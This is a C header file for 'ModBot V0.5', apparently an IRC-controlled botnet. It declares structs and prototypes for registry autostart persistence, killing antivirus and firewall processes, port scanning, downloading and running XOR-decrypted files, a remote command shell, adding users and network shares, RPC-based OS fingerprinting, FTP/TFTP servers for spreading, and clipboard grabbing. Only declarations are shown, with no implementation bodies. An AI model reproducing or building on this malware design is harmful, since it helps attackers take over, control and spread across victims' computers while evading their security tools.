/////////////////////////////////////////////////
//            120|-[ModBot]-V0.5               //
///////////////////////////////////////////////// 
typedef struct AUTOSTART
{
	HKEY hkey;
	LPCTSTR subkey;

} AUTOSTART;
//////////////////////////////////////////////////////////////////////////////////
BOOL checkos();
//////////////////////////////////////////////////////////////////////////////////
void AutoStartRegs(char *nfilename=NULL);
#ifndef NO_REGISTRY
DWORD WINAPI AutoRegistry(LPVOID param);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct DCC 
{
	SOCKET sock;
	SOCKET csock;
	char host[20];
	char filename[MAX_PATH];
	char sendto[128];
	int port;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} DCC;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
SOCKET CreateSock(char *host, int port);
DWORD WINAPI DCCSendThread(LPVOID param);
DWORD WINAPI DCCChatThread(LPVOID param);
DWORD WINAPI DCCGetThread(LPVOID param);

typedef struct ALIAS 
{
	 char name[24];
	 char command[160];

} ALIAS;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct SHOWLOG
{
	SOCKET sock;
	char chan[128];
	char filter[LOGLINE];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SHOWLOG;
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
int addalias(char *name, char *command);
void aliaslist(SOCKET sock, char *chan, BOOL notice);
void addlog(char *desc);
void addlogv(char *desc, ...);
void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter);
void clearlog(SOCKET sock, char *chan, BOOL notice, BOOL silent);
BOOL searchlog(char *filter);
DWORD WINAPI ShowLogThread(LPVOID param);
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_SCAN
typedef struct SCAN 
{
	SOCKET sock;
	char chan[128];
	int port;
	int delay;
	int threadnum;
	IN_ADDR addy;
	DWORD host;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	BOOL cgotinfo;

} SCAN;

DWORD WINAPI ScanConnectThread(LPVOID param);
DWORD WINAPI ScanThread(LPVOID param);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_DOWNLOAD

typedef struct DOWNLOAD 
{
	SOCKET sock;
	char chan[128];
	char url[256];
	char dest[256];
	int threadnum;
	int update;
	int run;
	unsigned long filelen;
	unsigned long expectedcrc;
	BOOL encrypted;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;

} DOWNLOAD;

DWORD WINAPI DownloadThread(LPVOID param);
char *Xorbuff(char *buffer,int bufferLen);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_NET
enum {NET_ADD, NET_DELETE, NET_INFO, NET_START, NET_STOP, NET_PAUSE, NET_CONTINUE};

#define IsVSD(x) ((x)?("Yes"):("No"))

typedef struct NetCommand
{
	char *action;
	char *completed;
	DWORD control;
	
} NetCommand;

char *Services(int action, char *ServiceName);
DWORD ServiceControl(int option, char *ServiceName, DWORD dwControl=0, DWORD nArg=0, LPCTSTR *pArg=NULL); 
static char *ServiceError(DWORD svcError);
BOOL ListServices(SOCKET sock, char *chan, BOOL notice);
char *Shares(int action, char *ShareName, char *SharePath=NULL);
static char *AsWideString(const char *cszANSIstring);
char *AsAnsiString(const WCHAR *cszWIDEstring);
NET_API_STATUS ShareAdd(char *ServerName, char *ShareName, char *SharePath);
NET_API_STATUS ShareDel(char *ServerName, char *ShareName);
BOOL ListShares(SOCKET sock, char *chan, BOOL notice, char *ServerName=NULL);
char *Users(int action, char *Username, char *Password, SOCKET sock, char *chan, BOOL notice);
NET_API_STATUS UserAdd(char *ServerName, char *Username, char *Password);
NET_API_STATUS UserDel(char *ServerName, char *Username);
NET_API_STATUS UserInfo(char *ServerName, char *Username, SOCKET sock, char *chan, BOOL notice);
BOOL ListUsers(SOCKET sock, char *chan, BOOL noice, char *ServerName=NULL);
static char *NasError(NET_API_STATUS nStatus);
char *NetSend(char *msg, SOCKET sock, char *chan, BOOL notice);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_HTTPD
typedef struct HTTPD 
{
	SOCKET sock;
	char chan[128];
	char file[MAX_PATH];
	char path[MAX_PATH];
	char dir[MAX_PATH];
	int port;
	int length;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL enabled;
	BOOL type;
	BOOL info;

} HTTPD;

DWORD WINAPI HTTP_Server_Thread(LPVOID param);
int Check_Requested_File(SOCKET sock, char *dir, char *rFile, BOOL dirinfo, int threadnum);
int GetFiles(char *current, SOCKET sock, char *chan, char *URL);
DWORD WINAPI HTTP_Header(LPVOID param);
void HTTP_Send_File(SOCKET sock, char *file);
char *File_To_HTML(char *file);
void HTTP_Connect(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *host, int port, char *method, char *url, char *referer);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
typedef struct DKSP
{
	__int64 AvailableBytes;
	__int64 FreeBytes;
	__int64 TotalBytes;

} DKSP;

typedef struct DKSPKB
{
	char AvailableKB[128];
	char FreeKB[128];
	char TotalKB[128];
	
} DKSPKB;

BOOL FileExists(char *filename, int mode=04);
const char *commaI64(unsigned __int64 number);
const char *DriveType(LPCSTR Drive);
DKSP DiskSpace(LPCSTR Drive);
DKSPKB DiskSpaceKB(LPCSTR Drive);
void DriveSpace(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive);
void DriveInfo(SOCKET sock, char *chan, BOOL notice, LPCSTR Drive);
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_PROCESS
typedef struct LPROC
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} LPROC;

BOOL AdjustPrivileges(char *pPriv, BOOL add);
int listProcesses(SOCKET sock, char *chan, BOOL notice, char *proccess, BOOL killthread=FALSE, BOOL full=false);
DWORD WINAPI listProcessesThread(LPVOID param);
int killProcess(int pid);
#ifndef NO_AVFW_KILL
DWORD WINAPI kill_av(LPVOID param);
#endif
#endif

typedef struct SECURE 
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL secure;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SECURE;

typedef struct NetShares
{
	char *ShareName;
	char *SharePath;
		
} NetShares;

DWORD WINAPI SecureThread(LPVOID param);
BOOL SecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent);
BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent);
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_SECSYSTEM
DWORD WINAPI AutoSecure(LPVOID param);
#endif


#define OS_UNKNOWN			0
#define OS_WINNT			1
#define OS_WIN2K			2
#define	OS_WINXP			3
#define OS_WIN2K3			4
#define OS_LINUX			5

#define FP_RPC				1
#define	FP_PORT5K			2
#define FP_TTL				3
#define FP_NP				4
#define FP_SMB				5

#define DCE_VERSION_MAJOR 0x05
#define DCE_VERSION_MINOR 0x00
#define DCE_PKT_BIND 0x0B
#define DCE_PKT_BINDACK 0x0C
#define DCE_PKT_BINDNACK 0x0D
#define DCE_PKT_REQUEST 0x00
#define DCE_PKT_FAULT 0x03
#define DCE_PKT_RESPONSE 0x02
#define DCE_PKT_ALTCONT 0x0E
#define DCE_PKT_ALTCONTRESP 0x0F
#define DCE_PKT_BINDRESP 0x10
#define RPC_FLG_FIRST 0x01
#define RPC_FLG_LAST 0x02

bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen);
int FpHost(const char *szHost, int iFpType);

#ifndef NO_TFTPD
typedef struct TFTP 
{
	SOCKET sock;
	char filename[MAX_PATH];
	char requestname[MAX_PATH];
	int threadnum;
	int threads;
	int port;
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TFTP;

DWORD WINAPI tftpserver(LPVOID pParam);
#endif
#ifndef NO_FTPD
typedef struct FTP 
{
	SOCKET sock;
	char filename[MAX_PATH];
	char requestname[MAX_PATH];
	int threadnum;
	int threads;
	int port;
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} FTP;

DWORD WINAPI ftpd(LPVOID pParam);
#endif
#define SHTDN_REASON_MAJOR_SYSTEM	0x00050000 // ripped from reason.h
#define SHTDN_REASON_MINOR_HUNG		0x00000005

#define SHUTDOWN_SYSTEM_HUNG		(SHTDN_REASON_MAJOR_SYSTEM|SHTDN_REASON_MINOR_HUNG) // for XP,2k only ignored on 9x
#define EWX_SYSTEM_REBOOT			(EWX_REBOOT | EWX_FORCE)
#define EWX_FORCE_SHUTDOWN			(EWX_SHUTDOWN | EWX_POWEROFF | EWX_FORCE)
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
char *replacestr(char *str, const char *substr, const char *repstr);
int Split(char *inStr, void *saveArray);
void initskip(char *s, int len, int skip[1024]);
int lstrindex(char c);
char *lstrstr(char *s, char *t);
char *PrintError(char *msg);
char *GetClipboardText(void);
BOOL mirccmd(char *cmd);
void SetFileTime(char *Filename);
DWORD CreateProc(char *file, char *param);
BOOL Reboot(void);
void uninstall(void);
int randnum(int range);
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
BOOL PrivateIP(const char *ip);
unsigned long ResolveAddress(char *szHost);
BOOL FlushARPCache(void);
BOOL FlushDNSCache(void);
char *GetIP(SOCKET sock);
USHORT checksum(USHORT *buffer, int size);
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_WILDCARD
int set(char **wildcard, char **test);
int asterisk(char **wildcard, char **test);
int wildcardfit(char *wildcard, char *test);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
void irc_sendv(SOCKET sock, char *msg, ...);
void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice, BOOL delay=FALSE);
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_EHANDLER
EXCEPTION_DISPOSITION cdecl _except_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
void *EstablisherFrame,struct _CONTEXT *ContextRecord,void *DispatcherContext);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_REMOTECMD
void Close_Handles(void);
BOOL send_commands(char *commands);
DWORD WINAPI PipeReadThread(LPVOID param);
int pipe_send(SOCKET sock,char *chan,char *buf);
int open_cmd(SOCKET sock,char * chan);
DWORD WINAPI PipeReadThread(LPVOID param);
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_AIM
BOOL CALLBACK EnumAIMChild(HWND hwnd, LPARAM lParam);
BOOL CALLBACK EnumAIM(HWND hwnd, LPARAM lParam);
#endif